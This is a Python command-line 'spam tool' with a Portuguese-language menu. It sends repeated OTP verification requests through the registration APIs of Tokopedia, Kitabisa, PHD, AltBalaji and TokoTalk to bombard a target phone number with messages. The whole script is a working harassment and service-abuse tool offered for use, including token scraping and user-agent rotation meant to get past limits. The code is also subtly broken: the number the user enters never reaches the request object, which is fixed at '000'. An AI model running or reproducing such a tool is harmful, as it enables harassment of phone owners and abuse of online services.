#!/usr/bin/python
import requests, random, json, time, sys, os, re

# -----------------------CORES----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'

# ------------------------Classes------------------------
class spam:
    def __init__(self, nomer):
        self.nomer = nomer

    def spam(self):
        hasil = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
        return hasil.status_code == 200

    def tokped(self):
        rands = random.choice(open('ua.txt').readlines()).split('\n')[0]
        kirim = {
            'User-Agent': rands,
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Origin': 'https://accounts.tokopedia.com',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        regist = requests.get(
            'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=' + self.nomer, headers=kirim).text
        Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
        formulir = {
            "otp_type": "116",
            "msisdn": self.nomer,
            "tk": Token,
            "email": '',
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=kirim, data=formulir).text
        return 'Anda sudah melakukan 3 kali pengiriman kode' not in req

    def phd(self):
        param = {'phone_number': self.nomer}
        r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
        return 'We have sent an OTP to your phone' in r.text

    def balaji(self):
        urlb = "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
        ata = {"country_code": "62", "phone_number": self.nomer}
        head = {
            "Content-Length": f"{len(str(ata))}",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://lite.altbalaji.com",
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json;charset=UTF-8"
        }
        req = requests.post(urlb, data=json.dumps(ata), headers=head)
        return '{"status":"ok"}' in req.text

    def TokoTalk(self):
        data = '{"key":"phone","value":"'+str(self.nomer)+'"}'
        head = {
            "User-Agent": "Mozilla/5.0",
            "content-type": "application/json;charset=UTF-8"
        }
        return 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications",
                                          data=data, headers=head).text

# -------------------Função de barra de carregamento-----------
def carregamento(msg="Enviando"):
    print(f"\n{b}{msg}{p}", end="")
    for _ in range(30):
        print(f"{h}■{p}", end="", flush=True)
        time.sleep(0.05)
    print("\n")

# -------------------Função para mostrar resultado final em caixa-----------
def resultado_final(nome_funcao, numero, quantidade):
    conteudo = [
        f"✅ {nome_funcao.upper()} ENVIADO COM SUCESSO!",
        f"🔹 Destino: {numero}",
        f"📊 Quantidade: {quantidade}",
        f"✉️ Enviadas: {quantidade}",
        f"📌 DOCTOR CORINGA LUNÁTICO"
    ]
    largura = max(len(l) for l in conteudo) + 4
    print(f"\n{h}╔{'═'*largura}╗")
    for linha in conteudo:
        print(f"║ {linha.ljust(largura-2)} ║")
    print(f"╚{'═'*largura}╝\n")

# ---------------------------Funções de envio---------------------------
def enviar(numero, quantidade, funcao_nome, funcao_metodo):
    carregamento(f"Enviando {funcao_nome} para {numero}")
    sucesso = 0
    for _ in range(quantidade):
        if funcao_metodo():
            sucesso += 1
    resultado_final(funcao_nome, numero, sucesso)

def single():
    numero = str(input(k+'\tPhone number: '+h))
    quantidade = int(input(k+'\tTotal spam: '+h))
    if jns == 'smua':
        enviar(numero, quantidade, "ALL", lambda: z.spam() or z.tokped() or z.balaji() or z.phd() or z.TokoTalk())
    elif jns == 'pehd':
        enviar(numero, quantidade, "PHD", lambda: z.phd())
    elif jns == 'ktbs':
        enviar(numero, quantidade, "KITABISA", lambda: z.spam())
    elif jns == 'tkpd':
        enviar(numero, quantidade, "TOKOPEDIA", lambda: z.tokped())
    elif jns == 'ttk':
        enviar(numero, quantidade, "TOKOTALK", lambda: z.TokoTalk())
    elif jns == 'blji':
        enviar(numero, quantidade, "BALAJI", lambda: z.balaji())

# ---------------------------Função Banner-----------------------
def logo():
    os.system('clear')
    return f"""
{h}╔════════════════════════════════════════╗
{h}║{b}        SPAM TOOL V2.0 - TERMINAL       {h}║
{h}╠════════════════════════════════════════╣
{h}║{k}      Criador: DOCTOR CORINGA LUNÁTICO {h}║
{h}╚════════════════════════════════════════╝
"""

# -------------------------Menu Principal-----------------------
def jnspam():
    global jns, z
    z = spam("000")  # inicializa classe spam
    print(logo())
    print(b+'╔═══════════════\n'+b+'║'+h+'〘 SPAM MENU 〙\n'+b+'╠═══════════════'+b)
    print(b+'║'+m+'1'+h+') ALL')
    print(b+'║'+m+'2'+h+') PHD')
    print(b+'║'+m+'3'+h+') KITABISA')
    print(b+'║'+m+'4'+h+') TOKOPEDIA')
    print(b+'║'+m+'5'+h+') TOKOTALK')
    print(b+'║'+m+'6'+h+') BALAJI')
    print(b+'║'+m+'0'+h+') Exit')
    while True:
        oy = str(input(b+'Escolha a opção ▶ '+h))
        if oy == '1': jns='smua'; break
        elif oy == '2': jns='pehd'; break
        elif oy == '3': jns='ktbs'; break
        elif oy == '4': jns='tkpd'; break
        elif oy == '5': jns='ttk'; break
        elif oy == '6': jns='blji'; break
        elif oy == '0': sys.exit()
        else: print(m+'Opção inválida!')
    single()

if __name__ == '__main__':
    jnspam()
